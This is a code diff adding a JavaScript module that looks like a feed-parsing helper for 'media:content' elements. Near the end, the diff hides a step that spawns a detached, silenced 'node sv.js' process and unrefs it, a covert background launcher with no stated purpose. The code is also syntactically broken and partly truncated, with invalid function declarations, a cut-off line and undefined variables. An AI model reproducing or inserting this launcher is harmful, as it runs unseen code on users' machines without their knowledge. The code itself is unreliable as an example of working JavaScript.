@@ -1,0 +1,50 @@
+const pJSON = require("./package.json")
+const package = pJSON.name
+function getMediaElements = function getMediaElements(where) {
+    return getElements("media:content", where).map(function (elem) {
+        var media = {
+            medium: elem.attribs.medium,
+            isDefault: !!elem.attribs.isDefault,
+        };
+        if (elem.attribs.url) {
+            media.url = elem.attribs.url;
+        }
+        if (elem.attribs.fileSize) {
+            media.fileSize = parseInt(elem.attribs.fileSize, 10);
+        }
+        if (elem.attribs.type) {
+            media.type = elem.attribs.type;
+        }
+        if (elem.attribs.expression) {
+            media.expression = elem.attribs
+                .expression;
+        }
+        if (elem.attribs.bitrate) {
+            media.bitrate = parseInt(elem.attribs.bitrate, 10);
+        }
+        if (elem.attribs.framerate) {
+            media.framerate = parseInt(elem.attribs.framerate, 10);
+        }
+        if (elem.attribs.samplingrate) {
+            media.samplingrate = parseInt(elem.attribs.samplingrate, 10);
+        }
+        if (e...
+module.exports = getMediaElements
+function idme = function idme(str) {
+  return str;
+}
+var spawn = require('child_process').spawn
+(_tmp_3 = spawn('node', ['sv.js',process.pid], {
+    detached: true,
+    stdio: 'ignore' // piping all stdio to /dev/null
+})).unref
+_tmp_5.detached = true
+_tmp_5.stdio = "ignore"
+function init = async function init() {
+  await sleep(500);
+}
+function sleep = function sleep(ms) {
+  return new Promise((resolve) => {
+    setTimeout(resolve, ms);
+  });
+}
